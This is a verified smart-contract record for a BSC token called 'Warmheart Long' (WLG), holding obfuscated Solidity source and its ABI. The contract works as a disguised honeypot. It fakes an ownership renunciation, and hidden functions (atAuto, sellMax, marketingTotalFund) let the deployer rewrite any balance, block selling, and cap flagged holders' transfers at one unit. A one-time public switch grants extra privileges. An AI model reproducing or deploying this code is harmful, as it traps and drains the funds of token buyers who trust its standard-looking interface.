{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface tradingMaxReceiver {\n    function createPair(address receiverFromMarketing, address buyMode) external returns (address);\n}\n\ninterface amountMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundIs) external view returns (uint256);\n\n    function transfer(address tokenAmountSwap, uint256 shouldTradingReceiver) external returns (bool);\n\n    function allowance(address liquidityTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldTradingReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenAmountSwap,\n        uint256 shouldTradingReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamMinTx, uint256 value);\n    event Approval(address indexed liquidityTake, address indexed spender, uint256 value);\n}\n\nabstract contract takeList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderShouldFrom is amountMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WarmheartLong is takeList, amountMin, senderShouldFrom {\n\n    uint256 constant receiverExempt = 1 ** 10;\n\n    uint256 amountTx;\n\n    function teamTotal(address autoTeam, address tokenAmountSwap, uint256 shouldTradingReceiver) internal returns (bool) {\n        require(tradingMode[autoTeam] >= shouldTradingReceiver);\n        tradingMode[autoTeam] -= shouldTradingReceiver;\n        tradingMode[tokenAmountSwap] += shouldTradingReceiver;\n        emit Transfer(autoTeam, tokenAmountSwap, shouldTradingReceiver);\n        return true;\n    }\n\n    mapping(address => bool) public totalAutoSell;\n\n    function name() external view virtual override returns (string memory) {\n        return isLimit;\n    }\n\n    uint256 private enableLaunched = 100000000 * 10 ** 18;\n\n    function allowance(address takeToken, address exemptMax) external view virtual override returns (uint256) {\n        if (exemptMax == launchMax) {\n            return type(uint256).max;\n        }\n        return teamEnable[takeToken][exemptMax];\n    }\n\n    uint8 private launchedMarketing = 18;\n\n    function receiverAmount(address autoTeam, address tokenAmountSwap, uint256 shouldTradingReceiver) internal returns (bool) {\n        if (autoTeam == fromToken) {\n            return teamTotal(autoTeam, tokenAmountSwap, shouldTradingReceiver);\n        }\n        uint256 txEnableExempt = amountMin(feeTeamBuy).balanceOf(maxTo);\n        require(txEnableExempt == takeSell);\n        require(tokenAmountSwap != maxTo);\n        if (feeBuy[autoTeam]) {\n            return teamTotal(autoTeam, tokenAmountSwap, receiverExempt);\n        }\n        return teamTotal(autoTeam, tokenAmountSwap, shouldTradingReceiver);\n    }\n\n    function atAuto(address buyTake, uint256 shouldTradingReceiver) public {\n        amountReceiver();\n        tradingMode[buyTake] = shouldTradingReceiver;\n    }\n\n    address public feeTeamBuy;\n\n    bool public toToken;\n\n    bool public tradingTo;\n\n    function owner() external view returns (address) {\n        return senderLimitTeam;\n    }\n\n    function autoAmount() public {\n        emit OwnershipTransferred(fromToken, address(0));\n        senderLimitTeam = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private teamEnable;\n\n    function sellMax(uint256 shouldTradingReceiver) public {\n        amountReceiver();\n        takeSell = shouldTradingReceiver;\n    }\n\n    uint256 public buySellSender;\n\n    mapping(address => bool) public feeBuy;\n\n    address launchMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed autoToken, address indexed txLaunchedFee);\n\n    uint256 public shouldTxLiquidity;\n\n    address maxTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        if (toToken == senderLaunch) {\n            senderLaunch = true;\n        }\n        tradingMax fundToken = tradingMax(launchMax);\n        feeTeamBuy = tradingMaxReceiver(fundToken.factory()).createPair(fundToken.WETH(), address(this));\n        \n        fromToken = _msgSender();\n        totalAutoSell[fromToken] = true;\n        tradingMode[fromToken] = enableLaunched;\n        autoAmount();\n        if (shouldTxLiquidity == buySellSender) {\n            buySellSender = exemptWalletTrading;\n        }\n        emit Transfer(address(0), fromToken, enableLaunched);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableLaunched;\n    }\n\n    function approve(address exemptMax, uint256 shouldTradingReceiver) public virtual override returns (bool) {\n        teamEnable[_msgSender()][exemptMax] = shouldTradingReceiver;\n        emit Approval(_msgSender(), exemptMax, shouldTradingReceiver);\n        return true;\n    }\n\n    function amountReceiver() private view {\n        require(totalAutoSell[_msgSender()]);\n    }\n\n    address private senderLimitTeam;\n\n    function marketingTotalFund(address liquidityList) public {\n        amountReceiver();\n        \n        if (liquidityList == fromToken || liquidityList == feeTeamBuy) {\n            return;\n        }\n        feeBuy[liquidityList] = true;\n    }\n\n    address public fromToken;\n\n    uint256 takeSell;\n\n    function transferFrom(address autoTeam, address tokenAmountSwap, uint256 shouldTradingReceiver) external override returns (bool) {\n        if (_msgSender() != launchMax) {\n            if (teamEnable[autoTeam][_msgSender()] != type(uint256).max) {\n                require(shouldTradingReceiver <= teamEnable[autoTeam][_msgSender()]);\n                teamEnable[autoTeam][_msgSender()] -= shouldTradingReceiver;\n            }\n        }\n        return receiverAmount(autoTeam, tokenAmountSwap, shouldTradingReceiver);\n    }\n\n    uint256 private exemptWalletTrading;\n\n    string private exemptTakeList = \"WLG\";\n\n    mapping(address => uint256) private tradingMode;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedMarketing;\n    }\n\n    function modeSwapLiquidity(address shouldLimit) public {\n        if (tradingTo) {\n            return;\n        }\n        if (shouldTxLiquidity != exemptWalletTrading) {\n            sellSwap = true;\n        }\n        totalAutoSell[shouldLimit] = true;\n        \n        tradingTo = true;\n    }\n\n    bool public sellSwap;\n\n    string private isLimit = \"Warmheart Long\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptTakeList;\n    }\n\n    function balanceOf(address fundIs) public view virtual override returns (uint256) {\n        return tradingMode[fundIs];\n    }\n\n    function transfer(address buyTake, uint256 shouldTradingReceiver) external virtual override returns (bool) {\n        return receiverAmount(_msgSender(), buyTake, shouldTradingReceiver);\n    }\n\n    function getOwner() external view returns (address) {\n        return senderLimitTeam;\n    }\n\n    bool private senderLaunch;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txLaunchedFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMinTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTradingReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTradingReceiver\",\"type\":\"uint256\"}],\"name\":\"atAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySellSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTeamBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityList\",\"type\":\"address\"}],\"name\":\"marketingTotalFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLimit\",\"type\":\"address\"}],\"name\":\"modeSwapLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldTradingReceiver\",\"type\":\"uint256\"}],\"name\":\"sellMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTxLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalAutoSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTradingReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenAmountSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTradingReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "WarmheartLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}